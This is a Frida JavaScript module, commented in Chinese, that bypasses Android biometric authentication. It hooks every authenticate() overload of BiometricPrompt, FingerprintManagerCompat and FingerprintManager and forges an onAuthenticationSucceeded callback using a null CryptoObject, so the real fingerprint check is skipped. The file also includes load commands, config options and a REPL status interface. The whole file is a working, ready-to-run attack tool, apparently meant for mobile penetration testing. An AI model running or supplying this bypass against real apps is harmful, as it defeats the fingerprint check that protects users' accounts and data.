/**
 * fingerprint_bypass.js - 指纹 / 生物识别认证绕过（模块化版）
 *
 * 原理：hook authenticate()，直接回调 onAuthenticationSucceeded(null-crypto)，
 *       不进入真实指纹校验。适用于服务端不校验签名/密文的实现（纯客户端校验）。
 *
 * 覆盖：
 *   - android.hardware.biometrics.BiometricPrompt（API 28+，全部 authenticate 重载）
 *   - androidx / support FingerprintManagerCompat
 *   - android.hardware.fingerprint.FingerprintManager（全部 authenticate 重载）
 *
 * 加载（交互式，日志实时打印）：
 *   frida -H 127.0.0.1:27042 -n Gadget \
 *     -l scripts/core/utils.js -l scripts/bypass/fingerprint_bypass.js
 *
 * 加载（后台跑，必须带 -t，否则 CLI 加载完就退出）：
 *   frida ... -q -t 600
 *
 * 配置：
 *   var CONFIG_OVERRIDE = {
 *     fingerprint_bypass: {
 *       forceSuccess: true,   // false = 只记录，不伪造
 *       dryRun: false,        // true = 只打印调用、不拦截（会走真实指纹，绕不过）
 *       verbose: true,        // 打印参数级细节（类型=值、构造过程）
 *       logBacktrace: false,  // 打印调用栈（排查"为什么没命中"）
 *       apis: ["biometric", "compat", "system"]
 *     }
 *   };
 *
 * REPL：
 *   FingerprintBypass.status()   // 配置 + 命中统计 + 已 hook 的 API
 *   FingerprintBypass.stats()    // 仅命中次数
 *   FingerprintBypass.reset()    // 清零统计
 */
(function (global) {
  'use strict';

  var U = global.Utils;
  if (!U) { console.log("[-] fingerprint_bypass requires utils.js (load it first)"); return; }

  var MODULE = "fingerprint_bypass";
  var VERSION = "1.1.0";

  var CONFIG = U.mergeConfig(MODULE, {
    forceSuccess: true,
    dryRun: false,
    logOnly: false,        // 兼容旧配置，等同 dryRun
    verbose: true,
    logBacktrace: false,
    apis: ["biometric", "compat", "system"]
  });

  var STATE = {
    hits: { biometric: 0, compat: 0, system: 0 },
    hooked: {},
    lastHit: null,
    lastBypass: null
  };

  function isDryRun() {
    return !!(CONFIG.dryRun || CONFIG.logOnly);
  }

  function enabled(api) {
    return CONFIG.apis.indexOf(api) >= 0;
  }

  function useFirst(names) {
    for (var i = 0; i < names.length; i++) {
      try { return Java.use(names[i]); } catch (e) { }
    }
    return null;
  }

  function short(v) {
    if (v === null || v === undefined) return "null";
    var s = String(v);
    return s.length > 80 ? s.substring(0, 80) + "..." : s;
  }

  function typedArgs(ov, args) {
    var out = [];
    for (var i = 0; i < args.length; i++) {
      var t = ov.argumentTypes[i] ? ov.argumentTypes[i].className : "?";
      out.push(t + "=" + short(args[i]));
    }
    return out.join(", ");
  }

  function overloadSig(ov) {
    var out = [];
    for (var i = 0; i < ov.argumentTypes.length; i++) out.push(ov.argumentTypes[i].className);
    return "(" + out.join(", ") + ")";
  }

  function trace(tag, context) {
    if (!CONFIG.logBacktrace) return;
    try {
      var frames = Thread.backtrace(context, Backtracer.ACCURATE).slice(0, 6).map(function (f) {
        var m = Process.findModuleByAddress(f);
        return m ? (m.name + "+0x" + f.sub(m.base).toString(16)) : String(f);
      });
      U.ok("      bt: " + frames.join(" <- "));
    } catch (e) {
      U.fail("      bt 失败: " + e);
    }
  }

  function makeCrypto(cls) {
    var builders = [
      { how: "CryptoObject(null)", fn: function () { return cls.$new(null); } },
      { how: "CryptoObject()", fn: function () { return cls.$new(); } }
    ];
    for (var i = 0; i < builders.length; i++) {
      try {
        var obj = builders[i].fn();
        if (CONFIG.verbose) U.ok("    [crypto] " + builders[i].how + " -> " + short(obj));
        return { obj: obj, how: builders[i].how };
      } catch (e) {
        if (CONFIG.verbose) U.fail("    [crypto] " + builders[i].how + " 失败: " + e);
      }
    }
    return { obj: null, how: "none" };
  }

  function makeResult(cls, crypto) {
    var builders = [
      { how: "(crypto,null,0,false)", fn: function () { return cls.$new(crypto, null, 0, false); } },
      { how: "(crypto,null,0)", fn: function () { return cls.$new(crypto, null, 0); } },
      { how: "(crypto,null)", fn: function () { return cls.$new(crypto, null); } },
      { how: "(crypto)", fn: function () { return cls.$new(crypto); } }
    ];
    for (var i = 0; i < builders.length; i++) {
      try {
        var obj = builders[i].fn();
        if (CONFIG.verbose) U.ok("    [result] " + builders[i].how + " -> " + short(obj));
        return { obj: obj, how: builders[i].how };
      } catch (e) {
        if (CONFIG.verbose) U.fail("    [result] " + builders[i].how + " 失败: " + e);
      }
    }
    return { obj: null, how: "none" };
  }

  function forceSuccess(tag, callback, cryptoCls, resultCls) {
    if (callback === null) {
      U.fail("[" + tag + "] callback 为空，无法伪造");
      return false;
    }
    U.ok("    [" + tag + "] callback class: " + callback.$className);

    var crypto = makeCrypto(cryptoCls);
    var result = makeResult(resultCls, crypto.obj);
    if (result.obj === null) {
      U.fail("[" + tag + "] AuthenticationResult 构造失败，回退原逻辑");
      return false;
    }

    try {
      callback.onAuthenticationSucceeded(result.obj);
      STATE.lastBypass = { api: tag, at: Date.now(), how: result.how };
      U.ok("[" + tag + "] onAuthenticationSucceeded 调用成功（result=" + result.how + "）");
      return true;
    } catch (e) {
      U.fail("[" + tag + "] onAuthenticationSucceeded 抛异常: " + e);
      return false;
    }
  }

  function onHit(tag, ov, args, context) {
    STATE.hits[tag]++;
    STATE.lastHit = { api: tag, at: Date.now() };
    U.ok("[" + tag + "] authenticate 命中 #" + STATE.hits[tag] +
         " thread=" + Process.getCurrentThreadId() +
         " overload=" + overloadSig(ov));
    if (CONFIG.verbose) U.ok("    [" + tag + "] params: " + typedArgs(ov, args));
    trace(tag, context);
  }

  function hookApi(tag, Manager, CryptoCls, ResultCls) {
    Manager.authenticate.overloads.forEach(function (ov) {
      ov.implementation = function () {
        var args = Array.prototype.slice.call(arguments);
        var cb = args.length ? args[args.length - 1] : null;
        onHit(tag, ov, args, this.context);

        if (isDryRun() || !CONFIG.forceSuccess) {
          U.ok("    [" + tag + "] dryRun/forceSuccess=false -> 调用原方法");
          return ov.apply(this, arguments);
        }
        if (forceSuccess(tag, cb, CryptoCls, ResultCls)) return;
        U.ok("    [" + tag + "] 伪造失败 -> 回退原方法");
        return ov.apply(this, arguments);
      };
      U.ok("  [install] " + tag + overloadSig(ov));
    });
    STATE.hooked[tag] = Manager.authenticate.overloads.length;
  }

  function install() {
    if (enabled("biometric")) {
      try {
        hookApi("biometric",
          Java.use("android.hardware.biometrics.BiometricPrompt"),
          Java.use("android.hardware.biometrics.BiometricPrompt$CryptoObject"),
          Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult"));
      } catch (e) { U.fail("[biometric] 不可用: " + e); }
    }

    if (enabled("compat")) {
      var Manager = useFirst([
        "androidx.core.hardware.fingerprint.FingerprintManagerCompat",
        "android.support.v4.hardware.fingerprint.FingerprintManagerCompat"
      ]);
      if (Manager === null) {
        U.fail("[compat] FingerprintManagerCompat 不存在");
      } else {
        try {
          var n = Manager.class.getName();
          hookApi("compat", Manager, Java.use(n + "$CryptoObject"), Java.use(n + "$AuthenticationResult"));
        } catch (e) { U.fail("[compat] 不可用: " + e); }
      }
    }

    if (enabled("system")) {
      try {
        hookApi("system",
          Java.use("android.hardware.fingerprint.FingerprintManager"),
          Java.use("android.hardware.fingerprint.FingerprintManager$CryptoObject"),
          Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult"));
      } catch (e) { U.fail("[system] 不可用: " + e); }
    }
  }

  Java.perform(function () {
    U.ok("=== " + MODULE + " v" + VERSION + " ===");
    U.ok("config: forceSuccess=" + CONFIG.forceSuccess + " dryRun=" + isDryRun() +
         " verbose=" + CONFIG.verbose + " backtrace=" + CONFIG.logBacktrace +
         " apis=[" + CONFIG.apis.join(",") + "]");

    install();

    U.ok("[done] hooked: " + JSON.stringify(STATE.hooked));
    if (isDryRun()) U.fail("[!] dryRun=true：只记录、不拦截，需要真实指纹");

    global.FingerprintBypass = {
      status: function () {
        return {
          version: VERSION,
          forceSuccess: CONFIG.forceSuccess,
          dryRun: isDryRun(),
          apis: CONFIG.apis,
          hookedOverloads: STATE.hooked,
          hits: STATE.hits,
          lastHit: STATE.lastHit,
          lastBypass: STATE.lastBypass
        };
      },
      stats: function () { return STATE.hits; },
      reset: function () {
        STATE.hits = { biometric: 0, compat: 0, system: 0 };
        STATE.lastHit = null;
        STATE.lastBypass = null;
        return "reset";
      }
    };
  });
})(this);
